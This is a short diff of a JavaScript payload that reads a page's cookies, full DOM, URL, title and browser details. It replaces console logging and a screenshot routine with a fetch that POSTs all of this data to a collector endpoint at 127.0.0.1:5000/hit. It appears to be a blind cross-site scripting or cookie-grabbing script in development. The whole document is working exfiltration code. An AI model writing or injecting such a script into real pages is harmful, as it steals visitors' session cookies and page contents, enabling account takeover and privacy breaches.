@@ -12,29 +12,23 @@ let user_agent = window.navigator.userAgent
 let browser_version = window.navigator.appVersion
 let language = window.navigator.language
 
-
-// GET IP ADDRESS
-
-
-console.log("HOST: " + host)
-console.log("ORIGIN: " + origin)
-console.log("URI: " + url)
-console.log("COOKIE: " +  cookie)
-console.log("PAGE TITLE: " + dom_title)
-console.log("THE DOM \n" + DOM)
-
-console.log("Operating System: " + OS)
-console.log("User Agent: " + user_agent)
-console.log("Version: " + browser_version)
-console.log("Language: " + language)
-
-
-const screenshotTarget = document.body;
-let base64image;
-
-html2canvas(screenshotTarget).then((canvas) => {
-    base64image = canvas.toDataURL("image/png");
-    console.log("IMAGE: " + base64image)
-    // TEST: https://www.rapidtables.com/web/tools/base64-to-image.html
-    // REMOVE>> (IMAGE: data:image/png;base64,)
-});
+fetch("http://127.0.0.1:5000/hit", {
+    method: "POST",
+    headers: {
+        "Content_Type": "application/json"
+    },
+    body: JSON.stringify({
+        host: host,
+        origin: origin,
+        url: url,
+        cookie: cookie,
+        dom_title: dom_title,
+        DOM: DOM,
+        OS: OS,
+        user_agent: user_agent,
+        browser_version: browser_version,
+        language: language
+    })
+})
+   .then()
+   .catch(error => console.log(error))
